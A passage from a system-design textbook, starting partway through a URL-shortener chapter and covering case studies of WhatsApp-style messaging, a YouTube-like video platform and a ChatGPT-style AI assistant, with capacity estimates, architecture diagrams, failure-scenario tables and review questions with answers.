A distributed key-value store partitioned by code (`code | long_url | owner | created_at | expires_at | status`); scrambled codes spread evenly. The create service writes new links into the cache so the creator's first click works despite replication lag. Redis cache-aside with LRU and TTL; edge caching for viral links (logging clicks at the edge if every click must count); negative caching for nonexistent codes; request coalescing to stop stampedes. Click events (code, time, country, referrer, device, bot flag) go to Kafka, are aggregated per minute, stored in a columnar OLAP store, and archived raw for replay; bots and preview crawlers are filtered. Updating a `click_count` column per redirect would mean 100K+ writes/s with viral links as hot rows.

### 57.6 Abuse, expiry and availability

Scan URLs at creation and periodically against malicious lists; disable flagged links everywhere including CDN caches; show warning interstitials; rate limit creation by user, key and IP; offer previews; allow only http and https. Expired links return 410 and are cleaned by background jobs; deletes invalidate caches. Redirects run active-active across regions with per-region ID ranges; the cache serves when the database is slow; Kafka buffers events if analytics is down.

### 57.7 Failure scenarios and fixes

| Scenario | Fix |
| --- | --- |
| Viral link stampedes the DB on expiry | Request coalescing, longer TTL for hot keys, edge cache |
| Scanner hammers random codes | Negative caching, rate limits, Bloom filter |
| Phishing link cached at CDN after takedown | 302 + short edge TTL + purge on disable |
| Creator's new link 404s | Write-through to cache on create |
| Counter coordinator down | Servers keep using their allocated ranges |
| Analytics DB outage | Redirects unaffected; events buffered in Kafka |

### 57.8 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Short shareable links, analytics, link management |
| Constraints | Permanent availability expectation, abuse, enumeration risk |
| Trade-offs | 302 analytics vs 301 load savings; random codes vs counters |
| Edge caching when | Viral links dominate traffic |
| Avoid | Synchronous analytics writes, guessable codes for private links |

```
Viral link day
 1 link → 2M clicks/hour → Redis hit 99.9% → edge caches 60 s → DB sees ~10 reads/hour
 Kafka absorbs 550 events/s for that link → per-minute aggregates update the dashboard
```

### Review questions

1. Why is a single global counter bad, and how does range allocation fix it?
2. Why reject updating `click_count` on every redirect?
3. Why choose 302 over 301?

#### Answers

1. A single counter makes every creation coordinate with one place: a bottleneck, a single point of failure and slow across regions. Range allocation gives each server a block of IDs to use locally, touching the coordinator once per block.
2. It would mean 100K+ database writes per second, with viral links becoming hot rows, slowing redirects and coupling them to database health. Emit click events to Kafka and aggregate them per minute into an analytics store instead.
3. 302 sends every click through the service, enabling click counts, destination changes and instant takedown of phishing links; 301 may be cached by browsers indefinitely.

## Chapter 58: Case Study: WhatsApp (Messaging)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Deliver every message exactly once, in order, instantly or later when offline, across devices, with encryption the server cannot read. |
| Why it is hard | Hundreds of millions of open connections, flaky mobile networks, retries that duplicate, and end-to-end encryption that removes server-side features. |
| How we solve it | Connection gateways with a session registry, per-device mailboxes, persist before acknowledging, client message IDs for dedupe, server sequence numbers, Signal-style encryption, and fan-out strategies by group size. |
| What fails, and why | Lost messages (✓ sent before saving), duplicates (no dedupe IDs), out-of-order chats (phone clocks used for ordering), and reconnect storms (no backoff or admission control). |

Deliver every message exactly once (to users), in order, instantly when online and reliably when offline, across devices, with end-to-end encryption the server cannot read. A WhatsApp-like design; WhatsApp has publicly stated it uses the Signal Protocol.

### 58.1 Requirements and estimation

1:1 and group messaging with media; ticks for sent, delivered and read; offline delivery; multi-device; presence and typing with privacy settings; push notifications; voice and video calls. E2EE shapes everything: no server-side content search, scanning or plain-text backups.

```
Messages:    2B DAU × 50 = 100B/day → ~1M/s avg → ~3M/s peak
Deliveries:  ~3 devices per message → ~3M/s avg → ~10M/s peak
Connections: ~500M-1B devices online; ~1M per gateway → ~500-1,000 servers
Text:        ~300 B each ≈ 30 TB/day flowing, mostly deleted on delivery
Media:       10B/day × ~200 KB ≈ 2 PB/day → object storage + CDN
```

The server stores messages only until delivered (WhatsApp has said undelivered messages are deleted after about 30 days); history lives on devices and user-controlled encrypted backups.

### 58.2 Architecture

```
Phones / laptops ─persistent encrypted connections─► edge (GeoDNS, L4 LB)
 → CONNECTION GATEWAYS (hundreds of millions of sockets, heartbeats)
 → MESSAGE SERVICE (stateless routing)
     session registry (user → devices → gateway) in Redis
     per-device mailboxes (write-optimized store)
     group service · push service (APNs/FCM) · key directory · presence
     Kafka for delivery events and metadata analytics only
 MEDIA SERVICE: resumable encrypted uploads → object storage → CDN
 CALLING: signaling over messages; media P2P / TURN relays / SFU
 ABUSE: rate limits, metadata signals, user reports
```

Stateful gateways are separated from stateless logic. In 2012, WhatsApp engineers publicly described pushing one Erlang server past about 2 million connections.

### 58.3 The life of a message

```
1 Sender app: client_msg_id + encrypt per recipient device
2 → gateway → message service → persist to recipient mailboxes (sequence assigned)
3 ACK to sender → ✓ (only after durable storage)
4 lookup recipient sessions → online: push via gateway | offline: push notification
5 recipient device ACK → ✓✓ → delete that mailbox copy
6 chat opened → read receipt message → blue ✓✓
```

At-least-once delivery plus `client_msg_id` dedupe yields effectively exactly-once. Sending ✓ before saving risks silent loss after a crash, because the sender stops retrying. Ordering uses server-assigned per-conversation sequence numbers and conversation-partitioned queues, never phone clocks; replies never appear before their parent.

### 58.4 Encryption

Devices upload public identity keys and one-time prekeys; a sender computes a shared secret asynchronously; keys ratchet per message for forward secrecy; safety numbers detect man-in-the-middle attacks; the server routes ciphertext only. Groups use Sender Keys so each message is encrypted once and fanned out; keys rotate when members leave. Each device has its own keys; senders encrypt for every device.

| Feature | With E2EE |
| --- | --- |
| Search history | On device |
| Spam detection | Metadata, behavior, rate and forwarding limits, user reports |
| Backups | Client-side encrypted, user-controlled |
| Push contents | Wake-up or encrypted payload |
| Link previews | Generated by sender's device |

### 58.5 Groups, gateways, media, presence, calls

Fan-out on write for bounded groups (\~200 mailbox writes per message, simple reads); fan-out on read for broadcast channels with millions of followers (store once, pull on open). Gateways use a compact binary protocol, tuned heartbeats balancing NAT timeouts and battery, Redis registries with TTLs, backoff and admission control against reconnect storms, and draining for deploys. Media is encrypted locally with a random key, uploaded in resumable chunks, referenced by a small E2EE message carrying URL, key and hash, downloaded from CDN edges, and expired by policy; forwards reuse the blob. Presence lives in TTL-based memory; typing indicators are ephemeral and sent only to viewers of the chat. Calls signal over messages, send media P2P or via TURN relays over UDP, and use SFUs for groups.

### 58.6 Failure scenarios and fixes

| Scenario | Fix |
| --- | --- |
| ✓ sent before persist, server crash | Persist before ACK |
| Duplicate after sender retry | `client_msg_id` dedupe |
| Messages out of order | Server sequence per conversation |
| Regional network blip, millions reconnect | Backoff + jitter, admission control |
| Gateway deploy drops users | Drain gradually; resync from mailbox |
| Member removed still reads group | Rotate sender keys |
| Viral misinformation | Forward limits and "forwarded many times" labels (publicly introduced by WhatsApp) |
| Presence storm | Push only to subscribers with the chat open; degrade presence first |

### 58.7 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Instant, private, reliable messaging across devices |
| Constraints | E2EE limits server features; mobile battery and networks; huge connection counts |
| Trade-offs | Store-until-delivered (privacy, low storage) vs server history (search, easy sync) |
| Fan-out on write when | Bounded groups |
| Fan-out on read when | Broadcast channels with huge audiences |

```
Offline delivery timeline
 09:00 Priya sends → ✓ (stored) · Arjun's phone off → push notification queued
 11:30 Arjun's phone connects → mailbox drained in order → ✓✓ → mailbox copy deleted
 11:31 Arjun opens chat → read receipt → blue ✓✓
```

### Review questions

1. Why show ✓ only after durable storage?
2. Why fan out on write for a family group but on read for a 5-million-follower channel?
3. Name two features E2EE makes harder and how they are still provided.

#### Answers

1. The ✓ promises the server has the message safely. If it were sent before saving and the server crashed, the sender would stop retrying and the message would be silently lost.
2. A 200-member group means \~200 bounded mailbox writes per message with simple reads and instant pushes; a 5-million-follower channel would need 5 million writes per post, mostly for followers who will not read soon, so store once and let followers pull.
3. Any two: history search happens on the device; spam detection uses metadata, behavior, rate and forwarding limits and user reports; backups are client-side encrypted; link previews are generated by the sender's device; multi-device works through per-device keys.

## Chapter 59: Case Study: YouTube (Video Platform)

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Accept hundreds of hours of uploaded video per minute and stream it smoothly to over a billion viewers on every device and network. |
| Why it is hard | Files are huge, transcoding is compute-heavy, storage reaches exabytes, delivery bandwidth dominates cost, and counts must resist fraud. |
| How we solve it | Resumable uploads to object storage, parallel chunked transcoding, popularity-aware codecs, tiered and erasure-coded storage, adaptive bitrate streaming, multi-tier CDNs with ISP caches, and stream-validated counters. |
| What fails, and why | Restarted uploads (no resumable chunks), duplicate renditions (non-idempotent jobs), origin overload on viral videos (no request collapsing), and hot-row likes (single counter updated millions of times). |

Huge files processed heavily once, then streamed billions of times worldwide: the hard problems are processing pipelines, exabyte storage and delivery bandwidth. A YouTube-like design; public facts (announced figures, Vitess, Google Global Cache, custom transcoding chips) are noted as such.

### 59.1 Requirements and estimation

Upload any format and length; watch smoothly on any device with seeking and quality switching; search, recommendations, subscriptions; likes, comments, view counts, creator analytics; live streaming with chat; copyright and moderation. Fast start, minimal buffering, durable uploads, massive read scale, cost efficiency; processing may take minutes.

```
Uploads:   500 hours/min (a figure YouTube has announced) → 720,000 hours/day
Storage:   ~5 GB per video-hour (original + renditions) → ~3.6 PB/day; ~5.4 PB/day with erasure coding (~1.5x)
Watching:  1B hours/day (also previously announced) × ~2.5 Mbps ≈ 1.1 EB/day ≈ ~100 Tbps average egress
Encodes:   ~8 resolutions × 2-3 codecs ≈ 20 per upload
```

Delivery dominates: each video is encoded once and watched up to millions of times, so codec and CDN savings multiply.

### 59.2 Architecture

```
UPLOAD PATH (async)
Creator → Upload API (auth, quotas) → pre-signed URL → resumable chunked upload → object storage (originals)
 → "upload completed" event → PROCESSING DAG: probe → split → parallel transcode (resolutions × codecs)
   → package HLS/DASH segments + manifests → thumbnails → captions (speech-to-text)
   → copyright fingerprinting → safety review (ML + humans) → PUBLISHED → notify, index, recommend

WATCH PATH (real-time)
Viewer → gateway → watch-page service (metadata, manifest URL, recs) → player
 → segments from CDN: ISP-embedded caches → edge PoPs → regional caches → origin
 → playback events → Kafka → view counts, watch time, QoE, recommendation training
```

Separating the paths means a transcoding backlog never slows playback.

### 59.3 Deep dives

Uploads go straight to object storage via time-limited pre-signed URLs in resumable chunks (a drop at 73% resumes from the last chunk); originals are kept for future re-encoding.

Transcoding splits videos at keyframes into chunks encoded in parallel by hundreds of workers (minutes instead of hours), each job idempotent with deterministic output paths so retries overwrite rather than duplicate. Publish low resolutions first; encode everything in a compatible codec (H.264) and spend expensive codecs (VP9, AV1) on popular videos, where bandwidth savings multiplied by views exceed encode cost. Google has publicly described custom video transcoding chips.

Storage tiers: hot in CDN and fast storage, warm regional, cold long-tail in erasure-coded object storage (data plus parity pieces, \~1.2-1.5x instead of 3x), with lifecycle policies and on-demand regeneration of rare renditions.

Playback: manifests list renditions; players start at modest quality with short segments, measure throughput and buffer, and choose per segment (adaptive bitrate via HLS or DASH); seeking jumps to segments. QoE metrics: time to first frame, rebuffering ratio, delivered bitrate, quality switches, failure rate.

CDN hierarchy: ISP-embedded caches (Google Global Cache, similar to Netflix Open Connect) serve popular videos from inside providers; trending content is pushed, long-tail pulled; request collapsing sends one upstream request for thousands of viewers; signed segment URLs.

Views, likes and comments: playback events are validated and fraud-filtered in streams; counts are eventually consistent (YouTube famously once paused public counts near 301 while verifying). Likes are per-user records (idempotent) with sharded counters, avoiding a hot `UPDATE videos SET likes = likes + 1` row. Metadata lives in sharded MySQL via Vitess, which YouTube created and open-sourced, heavily cached; comments in a wide-column store partitioned by video; search over titles, descriptions, tags and transcripts.

Recommendations use the funnel (Chapter 36) with watch-time and satisfaction objectives (YouTube has described moving beyond clicks); subscription feeds are built on read because channels have tens of millions of subscribers; trending is the fallback.

Live streaming: encoder → ingest (RTMP, SRT or WebRTC) → real-time ladder transcoding → short segments → CDN with request collapsing → viewers → archive as VOD. Latency tiers: standard (tens of seconds, most stable), low-latency (a few seconds), ultra-low via WebRTC (sub-second, harder at scale). Live chat fans out via pub/sub with rate limits, sampling and moderation.

Copyright and moderation: Content ID-style audio and video fingerprints matched against rights-holder references at scale (similarity search) apply block, track or monetize policies; ML classifiers plus human review, appeals and age restrictions.

### 59.4 Failure scenarios and fixes

| Scenario | Fix |
| --- | --- |
| Upload drops at 73% | Resumable chunked uploads |
| Transcode worker crashes | Idempotent chunk retries |
| Processing backlog spike | Queues absorb; low-res first keeps videos watchable |
| Viral video stampedes origin | Request collapsing, push to edges |
| Viewer's network weakens | ABR drops quality instead of freezing |
| Like counter hot row | Per-user records + sharded counters |
| Fake views | Stream validation and fraud filtering |
| Recommendations down | Trending fallback |
| Live stream latency complaints | Choose a lower-latency tier where interaction matters |

### 59.5 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Smooth playback anywhere, fast publishing, controlled delivery cost |
| Constraints | Exabyte storage, transcoding compute, CDN egress, copyright law |
| Trade-offs | More renditions (quality) vs storage; advanced codecs (bandwidth) vs encode cost; live latency vs stability |
| ISP caches when | Massive popular content |
| Origin pulls when | Long-tail videos |

```
Upload to watchable timeline (10-min 4K video)
 0:00 upload done → 0:30 360p ready (watchable) → 2:00 1080p → 6:00 4K
 AV1 encode only after it crosses a popularity threshold
```

### Review questions

1. Why split videos into chunks, and why must chunk jobs be idempotent?
2. Why use AV1 mainly for popular videos?
3. Why avoid `likes = likes + 1` for a viral video, and what instead?

#### Answers

1. Chunks let hundreds of workers encode in parallel (minutes instead of hours) and make failures cheap, since only a failed chunk is retried. Jobs must be idempotent because workers crash or receive duplicate tasks; writing to deterministic output paths means a rerun overwrites rather than duplicates.
2. Every video needs a widely compatible codec to play everywhere. Advanced codecs such as AV1 are expensive to encode, and their bandwidth savings scale with views, so the compute pays off only for popular videos.
3. Millions of updates to one row cause lock contention, a write ceiling, replication lag and double counts on retries. Store one like per user per video (idempotent) and maintain counts with sharded counters or stream aggregation, showing an approximate count.

## Chapter 60: Case Study: A ChatGPT-Style AI Assistant

#### The problem in one view

| Question | Answer |
| --- | --- |
| Problem statement | Serve a streaming AI assistant with history, tools, files and memory to a hundred million daily users. |
| Why it is hard | Every reply is generated fresh on scarce GPUs, contexts are long and costly, tools add risk, private data must stay isolated, and launches spike demand. |
| How we solve it | Resumable SSE streaming, persisted and idempotent messages, conversation trees, stable-prefix context with caching, model routing, an efficient inference fleet with admission control, sandboxed tools, isolated retrieval and memory, and layered guardrails. |
| What fails, and why | Launch-day overload (no priorities or admission control), duplicate replies and charges (no idempotency), soaring costs (changing prompt prefixes defeat caching), and incomplete deletion (no data map of every copy). |

The final boss combines all of classic system design with the AI realm. Unlike YouTube, nearly every response is generated fresh on expensive GPUs, so inference capacity sits at the center. A first-principles design, not any company's internal architecture.

### 60.1 Requirements and estimation

Streaming chat; conversation history with search, rename and delete; edit and regenerate (branches); stop generation; multiple models; files and images; tools (web search, code execution, file creation, MCP connectors); memory and custom instructions; projects with shared files; sharing; voice; a developer API. Low TTFT, availability during viral spikes, cost efficiency, safety, privacy, fairness.

```
Messages: 100M DAU × 10 = 1B/day → ~11,500/s avg → ~35,000/s peak
Tokens:   input 3T/day (~35M/s); output 0.5T/day (~5.8M/s avg, ~17M/s peak)
GPUs:     at ~10,000 output tokens/s per 8-GPU server → ~1,700 servers ≈ 14,000 GPUs at peak (illustrative)
Streams:  11,500/s × 15 s ≈ 170,000 open (peak ~500,000)
Storage:  1B × 4 KB ≈ 4 TB/day ≈ 1.5 PB/year
```

### 60.2 APIs

`POST /v1/conversations/{id}/messages` with an Idempotency-Key and `parent_message_id` returns an SSE stream of `message_start`, `token`, `tool_call`, `tool_result` and `message_end` (with usage) events; a cancel endpoint; cursor-paginated history; a full message tree; pre-signed file uploads; immutable share links. SSE fits one-way token streams over HTTP with last-event-ID resume; WebSockets serve voice.

### 60.3 Architecture

```
Clients → edge (GeoDNS, CDN, WAF) → API gateway (auth, plan quotas, rate limits)
 → STREAMING TIER (SSE, resumable streams)
 → CHAT ORCHESTRATOR (agent harness)
     load branch + settings → input guardrails → build context (system → instructions
     → memory → RAG → summarized history → tools) → route model → tool loop with budgets
     → output guardrails → stream → persist
     ├─ router + semantic cache  ├─ tools: search · sandbox · images · MCP
     ├─ retrieval (per user/project, permission-filtered)  └─ memory service
 → LLM GATEWAY → INFERENCE FLEET (continuous batching, KV/prefix cache, cache-aware routing, priorities)
 Data: conversations (sharded by user) · files (object storage) · vector indexes · Redis · Kafka · warehouse
 Observability & evals · billing from usage events
```

### 60.4 Deep dives

Message life: authenticate and check quota; open the stream; persist the user message first; build context; route to a replica holding the conversation's cached prefix; prefill, decode, stream through chunked output guardrails; persist the reply and usage; emit usage events. On disconnect, keep generating briefly and save; on Stop, cancel and free the batch slot and KV cache immediately. Resume streams from a short Redis buffer using event IDs. Idempotency keys return the same reply and never double-charge quota.

Conversations are trees: each message has `parent_message_id`, so edits and regenerations create branches the UI can switch between. Partition by user; store structured JSON; generate titles asynchronously with a small model; provide per-user history search; design deletion from day one.

Context order: system prompt, tool definitions and custom instructions first (stable, cached), then retrieved memories, RAG chunks, summarized history and the new message. Stable-first ordering maximizes prefix cache hits, cutting cost and TTFT because prefill skips the cached part.

Inference fleet: model routing (small, large, reasoning), continuous batching and paged KV caches, consistent-hash prefix routing balanced against load, priority tiers and admission control with honest "high demand" messages, separate pools for background work, multi-region capacity with warm pools, and fallbacks to other models or regions.

Tools run in an agent harness with search citations, microVM sandboxes per session, MCP connectors with OAuth and consent, budgets, approvals for side effects, streamed tool status, and on-demand tool loading. Files are uploaded via pre-signed URLs, malware-scanned, parsed (OCR), chunked, embedded and indexed per user or project with filters applied before ranking. Memory is extracted asynchronously, retrieved when relevant, viewable, editable, deletable and disableable. Sharing creates immutable, unguessable snapshots excluding private context, revocable and CDN-cacheable. Voice uses streaming STT-LLM-TTS or a realtime speech-to-speech model over WebRTC.

Safety layers input and output guardrails, model safety, action limits and account enforcement, tracking over-refusal as carefully as harmful output, with red teaming before launches. Plans enforce token-bucket quotas in Redis; usage events with idempotency IDs feed billing; the developer API has keys, per-org limits and dashboards. Launches go offline evals → safety evals → shadow → canary → A/B with rollback.

### 60.5 Failure scenarios and fixes

| Failure | Response |
| --- | --- |
| GPU capacity exhausted (5x demand at launch) | Admission control, priority tiers, quotas, smaller models with notice, reserved multi-region capacity, pause background work |
| Model or region down | Gateway failover with circuit breakers |
| Web search down | Answer without it and say so |
| Retrieval index slow | Answer from conversation context with a note |
| Conversation DB slow | Allow new chats; buffer writes via a queue |
| Memory service down | Skip memories (fail open) |
| Guardrail service down | Fail closed for risky actions, open with logging for chat |
| Stream dropped | Resume from last event ID; answer saved server-side |

Deleting a conversation must reach the messages DB and replicas, backups, history search, vector indexes, extracted memories, share snapshots and CDN caches, uploaded files with their chunks and embeddings, Redis buffers and semantic caches, logs and traces, Kafka events and the warehouse, eval samples, and generated titles, which requires a data map, IDs on every record, a deletion event pipeline and retention TTLs from day one.

### 60.6 Decision log

| Decision | Why | Trade-off |
| --- | --- | --- |
| SSE with resumable IDs | One-way tokens, HTTP-friendly | Separate realtime path for voice |
| Persist input first; idempotency | No lost inputs or duplicate charges | Extra write |
| Conversation tree, user-partitioned | Branches; per-user queries | Tree-aware UI |
| Stable-prefix context + summaries | Cache hits, bounded cost | Summaries lose detail |
| Model routing | Cost and capacity | Misrouting risk |
| Batching + prefix-aware routing | GPU efficiency | Hot replicas |
| Priorities, quotas, admission control | Survive spikes fairly | Some users wait |
| Sandboxed tools + MCP | Capabilities, contained risk | Latency, cost |
| Isolated retrieval and memory | Privacy | Per-tenant overhead |
| Async background work | Fast live path | Delayed titles, memory |
| Layered guardrails + over-refusal tracking | Safe and useful | Latency, tuning |
| Shadow → canary → A/B launches | Catch regressions | Slower rollouts |

### 60.7 Practitioner's guide

| Aspect | Details |
| --- | --- |
| Benefits | Helpful, fast, safe assistant with tools and memory at scale |
| Constraints | GPU capacity and cost, safety obligations, privacy laws, provider limits |
| Trade-offs | Bigger models (quality) vs capacity; memory (personal) vs privacy; strict guardrails vs helpfulness |
| Reasoning models when | Hard problems where accuracy beats latency |
| Small models when | Titles, classification, rewriting, simple FAQs |

```
One message cost anatomy (illustrative)
 3,000 input tokens (2,400 cached at ~10%) + 500 output, at Chapter 52's hypothetical prices → output ≈ 75% of cost
 → concise answers and caching are the biggest levers
```

### Review questions

1. Demand is 5x GPU capacity on launch day. Give three decisions that keep the service usable.
2. Why put stable content first in the context? Cost and latency benefits.
3. List every place a deleted conversation's data may live.

#### Answers

1. Admission control with priority tiers and quotas (paid and interactive first, honest "high demand" messages); model routing and graceful degradation (smaller models for simple requests, temporary caps on expensive features); and maximizing GPU efficiency (reserved multi-region capacity, continuous batching, prompt caching, pausing background work).
2. Prefix caching reuses only an identical beginning. Stable content first means every turn shares a cached prefix, so the server skips reprocessing it: cheaper input tokens and shorter prefill, which lowers TTFT. Changing content goes last so it does not invalidate the cache.
3. The messages database and replicas, backups, history search index, vector indexes, extracted memories, share snapshots and their CDN caches, uploaded files with chunks and embeddings, Redis buffers and semantic caches, logs and traces, Kafka events and the warehouse, eval samples and generated titles.
